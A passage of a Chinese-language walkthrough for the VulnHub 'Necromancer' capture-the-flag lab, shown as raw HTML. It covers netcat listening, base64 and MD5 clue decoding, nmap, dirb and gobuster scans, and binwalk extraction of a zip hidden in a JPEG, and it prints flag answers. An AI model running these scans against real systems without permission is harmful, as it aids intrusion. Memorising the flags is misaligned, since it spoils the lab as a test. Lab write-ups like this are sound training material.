+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>   <span class=m>15</span> 10.783315531 10.10.10.102 → 10.10.10.10  TCP <span class=m>78</span> <span class=m>9065</span> → <span class=m>4444</span> <span class=o>[</span>SYN<span class=o>]</span> <span class=nv>Seq</span><span class=o>=</span><span class=m>0</span> <span class=nv>Win</span><span class=o>=</span><span class=m>16384</span> <span class=nv>Len</span><span class=o>=</span><span class=m>0</span> <span class=nv>MSS</span><span class=o>=</span><span class=m>1460</span> SACK_PERM <span class=nv>WS</span><span class=o>=</span><span class=m>8</span> <span class=nv>TSval</span><span class=o>=</span><span class=m>143020430</span> <span class=nv>TSecr</span><span class=o>=</span><span class=m>0</span>                                                               
+</span></span><span class=line><span class=cl>   <span class=m>16</span> 10.783334820  10.10.10.10 → 10.10.10.102 TCP <span class=m>54</span> <span class=m>4444</span> → <span class=m>9065</span> <span class=o>[</span>RST, ACK<span class=o>]</span> <span class=nv>Seq</span><span class=o>=</span><span class=m>1</span> <span class=nv>Ack</span><span class=o>=</span><span class=m>1</span> <span class=nv>Win</span><span class=o>=</span><span class=m>0</span> <span class=nv>Len</span><span class=o>=</span><span class=m>0</span> 
+</span></span></code></pre></td></tr></table></div></div><p>靶机会扫描本地子网中存活的机器。如果它发现有一台机器处于活动状态，就会尝试通过端口 4444 与这台机器连接</p><h2 id=收到666链接并获取一段base64编码字符>收到666链接并获取一段base64编码字符</h2><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>┌──<span class=o>(</span>kali㉿kali<span class=o>)</span>-<span class=o>[</span>~/Labs/Vulnhub/Necromancer<span class=o>]</span>
+</span></span><span class=line><span class=cl>└─$ nc -lvnp <span class=m>4444</span>
+</span></span><span class=line><span class=cl>listening on <span class=o>[</span>any<span class=o>]</span> <span class=m>4444</span> ...
+</span></span><span class=line><span class=cl>connect to <span class=o>[</span>10.10.10.10<span class=o>]</span> from <span class=o>(</span>UNKNOWN<span class=o>)</span> <span class=o>[</span>10.10.10.102<span class=o>]</span> <span class=m>34039</span>
+</span></span><span class=line><span class=cl>...V2VsY29tZSENCg0KWW91IGZpbmQgeW91cnNlbGYgc3RhcmluZyB0b3dhcmRzIHRoZSBob3Jpem9uLCB3aXRoIG5vdGhpbmcgYnV0IHNpbGVuY2Ugc3Vycm91bmRpbmcgeW91Lg0KWW91IGxvb2sgZWFzdCwgdGhlbiBzb3V0aCwgdGhlbiB3ZXN0LCBhbGwgeW91IGNhbiBzZWUgaXMgYSBncmVhdCB3YXN0ZWxhbmQgb2Ygbm90aGluZ25lc3MuDQoNClR1cm5pbmcgdG8geW91ciBub3J0aCB5b3Ugbm90aWNlIGEgc21hbGwgZmxpY2tlciBvZiBsaWdodCBpbiB0aGUgZGlzdGFuY2UuDQpZb3Ugd2FsayBub3J0aCB0b3dhcmRzIHRoZSBmbGlja2VyIG9mIGxpZ2h0LCBvbmx5IHRvIGJlIHN0b3BwZWQgYnkgc29tZSB0eXBlIG9mIGludmlzaWJsZSBiYXJyaWVyLiAgDQoNClRoZSBhaXIgYXJvdW5kIHlvdSBiZWdpbnMgdG8gZ2V0IHRoaWNrZXIsIGFuZCB5b3VyIGhlYXJ0IGJlZ2lucyB0byBiZWF0IGFnYWluc3QgeW91ciBjaGVzdC4gDQpZb3UgdHVybiB0byB5b3VyIGxlZnQuLiB0aGVuIHRvIHlvdXIgcmlnaHQhICBZb3UgYXJlIHRyYXBwZWQhDQoNCllvdSBmdW1ibGUgdGhyb3VnaCB5b3VyIHBvY2tldHMuLiBub3RoaW5nISAgDQpZb3UgbG9vayBkb3duIGFuZCBzZWUgeW91IGFyZSBzdGFuZGluZyBpbiBzYW5kLiAgDQpEcm9wcGluZyB0byB5b3VyIGtuZWVzIHlvdSBiZWdpbiB0byBkaWcgZnJhbnRpY2FsbHkuDQoNCkFzIHlvdSBkaWcgeW91IG5vdGljZSB0aGUgYmFycmllciBleHRlbmRzIHVuZGVyZ3JvdW5kISAgDQpGcmFudGljYWxseSB5b3Uga2VlcCBkaWdnaW5nIGFuZCBkaWdnaW5nIHVudGlsIHlvdXIgbmFpbHMgc3VkZGVubHkgY2F0Y2ggb24gYW4gb2JqZWN0Lg0KDQpZb3UgZGlnIGZ1cnRoZXIgYW5kIGRpc2NvdmVyIGEgc21hbGwgd29vZGVuIGJveC4gIA0KZmxhZzF7ZTYwNzhiOWIxYWFjOTE1ZDExYjlmZDU5NzkxMDMwYmZ9IGlzIGVuZ3JhdmVkIG9uIHRoZSBsaWQuDQoNCllvdSBvcGVuIHRoZSBib3gsIGFuZCBmaW5kIGEgcGFyY2htZW50IHdpdGggdGhlIGZvbGxvd2luZyB3cml0dGVuIG9uIGl0LiAiQ2hhbnQgdGhlIHN0cmluZyBvZiBmbGFnMSAtIHU2NjYi... 
+</span></span></code></pre></td></tr></table></div></div><p>这串字符符合base64编码的特征，下面是解码结果</p><h2 id=获取flag1>获取flag1</h2><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>Welcome!
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>You find yourself staring towards the horizon, with nothing but silence surrounding you.
+</span></span><span class=line><span class=cl>You look east, then south, then west, all you can see is a great wasteland of nothingness.
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>Turning to your north you notice a small flicker of light in the distance.
+</span></span><span class=line><span class=cl>You walk north towards the flicker of light, only to be stopped by some type of invisible barrier.  
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>The air around you begins to get thicker, and your heart begins to beat against your chest. 
+</span></span><span class=line><span class=cl>You turn to your left.. then to your right!  You are trapped!
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>You fumble through your pockets.. nothing!  
+</span></span><span class=line><span class=cl>You look down and see you are standing in sand.  
+</span></span><span class=line><span class=cl>Dropping to your knees you begin to dig frantically.
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>As you dig you notice the barrier extends underground!  
+</span></span><span class=line><span class=cl>Frantically you keep digging and digging until your nails suddenly catch on an object.
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>You dig further and discover a small wooden box.  
+</span></span><span class=line><span class=cl>flag1{e6078b9b1aac915d11b9fd59791030bf} is engraved on the lid.
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>You open the box, and find a parchment with the following written on it. &#34;Chant the string of flag1 - u666&#34;
+</span></span></code></pre></td></tr></table></div></div><h2 id=获取flag2>获取flag2</h2><p>故事中给了 flag1{e6078b9b1aac915d11b9fd59791030bf}，而羊皮纸上的提示是 Chant the string of flag1 - u666</p><p>flag的内容一个 32 位的十六进制字符串，这是典型的MD5 哈希值特征。</p><p>这个字符串符合 MD5 哈希的典型格式，可以使用在线数据库或字典进行反查</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>opensesame
+</span></span></code></pre></td></tr></table></div></div><p>然后我们需要继续之前的操作</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>nc -lvnp <span class=m>4444</span>
+</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl><span class=nb>echo</span> <span class=s2>&#34;opensesame&#34;</span> <span class=p>|</span> nc -u 10.10.10.102 <span class=m>666</span>
+</span></span></code></pre></td></tr></table></div></div><p>最后实测不需要nc监听4444端口,只执行第二条就有回显，在这之前执行一直没反应，重启了下靶机解决问题</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>┌──<span class=o>(</span>kali㉿kali<span class=o>)</span>-<span class=o>[</span>~/Labs/Vulnhub/Necromancer<span class=o>]</span>
+</span></span><span class=line><span class=cl>└─$ <span class=nb>echo</span> <span class=s2>&#34;opensesame&#34;</span> <span class=p>|</span> nc -u 10.10.10.102 <span class=m>666</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>A loud crack of thunder sounds as you are knocked to your feet!
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>Dazed, you start to feel fresh air entering your lungs.
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>You are free!
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>In front of you written in the sand are the words:
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>flag2<span class=o>{</span>c39cd4df8f2e35d20d92c2e44de5f7c6<span class=o>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>As you stand to your feet you notice that you can no longer see the flicker of light in the distance.
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>You turn frantically looking in all directions <span class=k>until</span> suddenly, a murder of crows appear on the horizon.
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>As they get closer you can see one of the crows is grasping on to an object. As the sun hits the object, shards of light beam from its surface.
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>The birds get closer, and closer, and closer.
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>Staring up at the crows you can see they are in a formation.
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>Squinting your eyes from the light coming from the object, you can see the formation looks like the numeral 80.
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>As quickly as the birds appeared, they have left you once again.... alone... tortured by the deafening sound of silence.
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=m>666</span> is closed.
+</span></span></code></pre></td></tr></table></div></div><h2 id=获取flag3>获取flag3</h2><p>告诉我们乌鸦排成了数字 80 的形状，666端口已经关闭，说明可能是80端口开放了</p><p>重新使用nmap看看</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>┌──<span class=o>(</span>kali㉿kali<span class=o>)</span>-<span class=o>[</span>~/Labs/Vulnhub/Necromancer<span class=o>]</span>
+</span></span><span class=line><span class=cl>└─$ sudo nmap -sS -sV -sC -p <span class=m>80</span> 10.10.10.102
+</span></span><span class=line><span class=cl>Starting Nmap 7.99 <span class=o>(</span> https://nmap.org <span class=o>)</span> at 2026-10-06 12:47 -0400
+</span></span><span class=line><span class=cl>Nmap scan report <span class=k>for</span> 10.10.10.102
+</span></span><span class=line><span class=cl>Host is up <span class=o>(</span>0.00058s latency<span class=o>)</span>.
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>PORT   STATE SERVICE VERSION
+</span></span><span class=line><span class=cl>80/tcp open  http    OpenBSD httpd
+</span></span><span class=line><span class=cl><span class=p>|</span>_http-title: The Chasm
+</span></span><span class=line><span class=cl>MAC Address: 00:0C:29:27:05:E2 <span class=o>(</span>VMware<span class=o>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span class=line><span class=cl>Nmap <span class=k>done</span>: <span class=m>1</span> IP address <span class=o>(</span><span class=m>1</span> host up<span class=o>)</span> scanned in 12.01 seconds
+</span></span></code></pre></td></tr></table></div></div><h3 id=web服务探测>Web服务探测</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>Hours have passed since you first started to follow the crows.  
+</span></span><span class=line><span class=cl>  
+</span></span><span class=line><span class=cl>Silence continues to engulf you as you treck towards a mountain range on the horizon.  
+</span></span><span class=line><span class=cl>  
+</span></span><span class=line><span class=cl>More times passes and you are now standing in front of a great chasm.  
+</span></span><span class=line><span class=cl>  
+</span></span><span class=line><span class=cl>Across the chasm you can see a necromancer standing in the mouth of a cave, staring skyward at the circling crows.  
+</span></span><span class=line><span class=cl>  
+</span></span><span class=line><span class=cl>As you step closer to the chasm, a rock dislodges from beneath your feet and falls into the dark depths.  
+</span></span><span class=line><span class=cl>  
+</span></span><span class=line><span class=cl>The necromancer looks towards you with hollow eyes which can only be described as death.  
+</span></span><span class=line><span class=cl>  
+</span></span><span class=line><span class=cl>He smirks in your direction, and suddenly a bright light momentarily blinds you.  
+</span></span><span class=line><span class=cl>  
+</span></span><span class=line><span class=cl>The silence is broken by a blood curdling screech of a thousand birds, followed by the necromancers laughs fading as he decends into the cave!  
+</span></span><span class=line><span class=cl>  
+</span></span><span class=line><span class=cl>The crows break their formation, some flying aimlessly in the air; others now motionless upon the ground.  
+</span></span><span class=line><span class=cl>  
+</span></span><span class=line><span class=cl>The cave is now protected by a gaseous blue haze, and an organised pile of feathers lay before you.
+</span></span></code></pre></td></tr></table></div></div><p>还要一张图片，然后这个网页就没有内容了，查看源码发现一个目录</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>&lt;img <span class=nv>src</span><span class=o>=</span><span class=s2>&#34;[/pics/pileoffeathers.jpg](http://10.10.10.102/pics/pileoffeathers.jpg)&#34;</span>&gt;
+</span></span></code></pre></td></tr></table></div></div><p>这个pics访问返回403，接下来目录爆破</p><h3 id=目录爆破>目录爆破</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>┌──<span class=o>(</span>kali㉿kali<span class=o>)</span>-<span class=o>[</span>~<span class=o>]</span>
+</span></span><span class=line><span class=cl>└─$ sudo dirb http://10.10.10.102               
+</span></span><span class=line><span class=cl>-----------------
+</span></span><span class=line><span class=cl>DIRB v2.22    
+</span></span><span class=line><span class=cl>By The Dark Raver
+</span></span><span class=line><span class=cl>-----------------
+</span></span><span class=line><span class=cl>START_TIME: Tue Oct  <span class=m>6</span> 14:32:59 <span class=m>2026</span>
+</span></span><span class=line><span class=cl>URL_BASE: http://10.10.10.102/
+</span></span><span class=line><span class=cl>WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
+</span></span><span class=line><span class=cl>-----------------
+</span></span><span class=line><span class=cl>GENERATED WORDS: <span class=m>4612</span>                                                     
+</span></span><span class=line><span class=cl>---- Scanning URL: http://10.10.10.102/ ----
+</span></span><span class=line><span class=cl>+ http://10.10.10.102/index.html <span class=o>(</span>CODE:200<span class=p>|</span>SIZE:1416<span class=o>)</span>
+</span></span><span class=line><span class=cl><span class=o>==</span>&gt; DIRECTORY: http://10.10.10.102/pics/                                
+</span></span><span class=line><span class=cl>---- Entering directory: http://10.10.10.102/pics/ ----
+</span></span><span class=line><span class=cl>-----------------
+</span></span><span class=line><span class=cl>END_TIME: Tue Oct  <span class=m>6</span> 14:33:20 <span class=m>2026</span>
+</span></span><span class=line><span class=cl>DOWNLOADED: <span class=m>9224</span> - FOUND: <span class=m>1</span>
+</span></span></code></pre></td></tr></table></div></div><p>目录爆破也是得到同样的内容</p><p>目前没有任何线索，先在后台挂一个字典更大的目录爆破</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>gobuster dir -u http://10.10.10.102 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt,bak,zip -t <span class=m>50</span>
+</span></span></code></pre></td></tr></table></div></div><h3 id=将80端口的照片下载下来静态分析>将80端口的照片下载下来静态分析</h3><p>感觉除了照片其他线索都摸过了，为了防止掉进兔子洞，先把这张图片下载站下来静态分析</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>wget http://10.10.10.102/pics/pileoffeathers.jpg
+</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>┌──<span class=o>(</span>kali㉿kali<span class=o>)</span>-<span class=o>[</span>~/Labs/Vulnhub/Necromancer<span class=o>]</span>
+</span></span><span class=line><span class=cl>└─$ file pileoffeathers.jpg <span class=o>&amp;&amp;</span> ls -la pileoffeathers.jpg
+</span></span><span class=line><span class=cl>pileoffeathers.jpg: JPEG image data, Exif standard: <span class=o>[</span>TIFF image data, little-endian, <span class=nv>direntries</span><span class=o>=</span>0<span class=o>]</span>, baseline, precision 8, 640x290, components <span class=m>3</span>
+</span></span><span class=line><span class=cl>-rw-rw-r-- <span class=m>1</span> kali kali <span class=m>37289</span> 2016年 5月 9日 pileoffeathers.jpg
+</span></span></code></pre></td></tr></table></div></div><p>是一个标准的 JPEG，带有 EXIF 数据。现在我们来深入分析它，看看里面有没有藏 flag 或线索。</p><ol><li>提取可打印字符串</li></ol><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>strings pileoffeathers.jpg <span class=p>|</span> head -80
+</span></span></code></pre></td></tr></table></div></div><p>没有直接可见的 flag 或明文提示。假如这是线索，那么线索要么藏在图片的像素/视觉内容里，要么是隐写数据。</p><ol start=2><li>查看 EXIF 元数据</li></ol><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span><span class=lnt>32
+</span><span class=lnt>33
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>┌──<span class=o>(</span>kali㉿kali<span class=o>)</span>-<span class=o>[</span>~/Labs/Vulnhub/Necromancer<span class=o>]</span>
+</span></span><span class=line><span class=cl>└─$ exiftool pileoffeathers.jpg
+</span></span><span class=line><span class=cl>ExifTool Version Number         : 13.55
+</span></span><span class=line><span class=cl>File Name                       : pileoffeathers.jpg
+</span></span><span class=line><span class=cl>Directory                       : .
+</span></span><span class=line><span class=cl>File Size                       : <span class=m>37</span> kB
+</span></span><span class=line><span class=cl>File Modification Date/Time     : 2016:05:09 07:44:22-04:00
+</span></span><span class=line><span class=cl>File Access Date/Time           : 2026:10:06 14:44:45-04:00
+</span></span><span class=line><span class=cl>File Inode Change Date/Time     : 2026:10:06 14:44:26-04:00
+</span></span><span class=line><span class=cl>File Permissions                : -rw-rw-r--
+</span></span><span class=line><span class=cl>File Type                       : JPEG
+</span></span><span class=line><span class=cl>File Type Extension             : jpg
+</span></span><span class=line><span class=cl>MIME Type                       : image/jpeg
+</span></span><span class=line><span class=cl>Exif Byte Order                 : Little-endian <span class=o>(</span>Intel, II<span class=o>)</span>
+</span></span><span class=line><span class=cl>Quality                         : 60%
+</span></span><span class=line><span class=cl>XMP Toolkit                     : Adobe XMP Core 5.0-c060 61.134777, 2010/02/12-17:32:00
+</span></span><span class=line><span class=cl>Creator Tool                    : Adobe Photoshop CS5 Windows
+</span></span><span class=line><span class=cl>Instance ID                     : xmp.iid:9678990A5A7D11E293DFC864BA726A9F
+</span></span><span class=line><span class=cl>Document ID                     : xmp.did:9678990B5A7D11E293DFC864BA726A9F
+</span></span><span class=line><span class=cl>Derived From Instance ID        : xmp.iid:967899085A7D11E293DFC864BA726A9F
+</span></span><span class=line><span class=cl>Derived From Document ID        : xmp.did:967899095A7D11E293DFC864BA726A9F
+</span></span><span class=line><span class=cl>DCT Encode Version              : <span class=m>100</span>
+</span></span><span class=line><span class=cl>APP14 Flags <span class=m>0</span>                   : <span class=o>[</span>14<span class=o>]</span>, Encoded with <span class=nv>Blend</span><span class=o>=</span><span class=m>1</span> downsampling
+</span></span><span class=line><span class=cl>APP14 Flags <span class=m>1</span>                   : <span class=o>(</span>none<span class=o>)</span>
+</span></span><span class=line><span class=cl>Color Transform                 : YCbCr
+</span></span><span class=line><span class=cl>Image Width                     : <span class=m>640</span>
+</span></span><span class=line><span class=cl>Image Height                    : <span class=m>290</span>
+</span></span><span class=line><span class=cl>Encoding Process                : Baseline DCT, Huffman coding
+</span></span><span class=line><span class=cl>Bits Per Sample                 : <span class=m>8</span>
+</span></span><span class=line><span class=cl>Color Components                : <span class=m>3</span>
+</span></span><span class=line><span class=cl>Y Cb Cr Sub Sampling            : YCbCr4:4:4 <span class=o>(</span><span class=m>1</span> 1<span class=o>)</span>
+</span></span><span class=line><span class=cl>Image Size                      : 640x290
+</span></span><span class=line><span class=cl>Megapixels                      : 0.186
+</span></span></code></pre></td></tr></table></div></div><p>根据我的经验没发现什么特殊的</p><ol start=3><li>检测是否嵌入了其他文件</li></ol><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span><span class=lnt>7
+</span><span class=lnt>8
+</span><span class=lnt>9
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>┌──<span class=o>(</span>kali㉿kali<span class=o>)</span>-<span class=o>[</span>~/Labs/Vulnhub/Necromancer<span class=o>]</span>
+</span></span><span class=line><span class=cl>└─$ binwalk pileoffeathers.jpg
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>DECIMAL       HEXADECIMAL     DESCRIPTION
+</span></span><span class=line><span class=cl>--------------------------------------------------------------------------------
+</span></span><span class=line><span class=cl><span class=m>0</span>             0x0             JPEG image data, EXIF standard
+</span></span><span class=line><span class=cl><span class=m>12</span>            0xC             TIFF image data, little-endian offset of first image directory: <span class=m>8</span>
+</span></span><span class=line><span class=cl><span class=m>36994</span>         0x9082          Zip archive data, at least v2.0 to extract, compressed size: 121, uncompressed size: 125, name: feathers.txt
+</span></span><span class=line><span class=cl><span class=m>37267</span>         0x9193          End of Zip archive, footer length: <span class=m>22</span>
+</span></span></code></pre></td></tr></table></div></div><p>图片末尾嵌入了一个 <strong>ZIP 压缩包</strong>，里面包含一个 feathers.txt 文件。</p><p>加个-e参数提取一下</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>┌──<span class=o>(</span>kali㉿kali<span class=o>)</span>-<span class=o>[</span>~/Labs/Vulnhub/Necromancer<span class=o>]</span>
+</span></span><span class=line><span class=cl>└─$ binwalk -e pileoffeathers.jpg
+</span></span><span class=line><span class=cl>DECIMAL       HEXADECIMAL     DESCRIPTION
+</span></span><span class=line><span class=cl>--------------------------------------------------------------------------------
+</span></span><span class=line><span class=cl><span class=m>36994</span>         0x9082          Zip archive data, at least v2.0 to extract, compressed size: 121, uncompressed size: 125, name: feathers.txt
+</span></span><span class=line><span class=cl>WARNING: One or more files failed to extract: either no utility was found or it<span class=err>&#39;</span>s unimplemented     
+</span></span><span class=line><span class=cl>┌──<span class=o>(</span>kali㉿kali<span class=o>)</span>-<span class=o>[</span>~/Labs/Vulnhub/Necromancer<span class=o>]</span>
+</span></span><span class=line><span class=cl>└─$ ls -la _pileoffeathers.jpg.extracted/
+</span></span><span class=line><span class=cl>总计 <span class=m>16</span>
+</span></span><span class=line><span class=cl>drwxrwxr-x <span class=m>2</span> kali kali <span class=m>4096</span> 10月 6日 14:52 .
+</span></span><span class=line><span class=cl>drwxrwxr-x <span class=m>3</span> kali kali <span class=m>4096</span> 10月 6日 14:52 ..
+</span></span><span class=line><span class=cl>-rw-rw-r-- <span class=m>1</span> kali kali  <span class=m>295</span> 10月 6日 14:52 9082.zip
+</span></span><span class=line><span class=cl>-rw-r--r-- <span class=m>1</span> kali kali  <span class=m>125</span> 2016年 5月 8日 feathers.txt
+</span></span></code></pre></td></tr></table></div></div><p>提取成功，读取这个txt文本</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>┌──<span class=o>(</span>kali㉿kali<span class=o>)</span>-<span class=o>[</span>~/Labs/Vulnhub/Necromancer<span class=o>]</span>
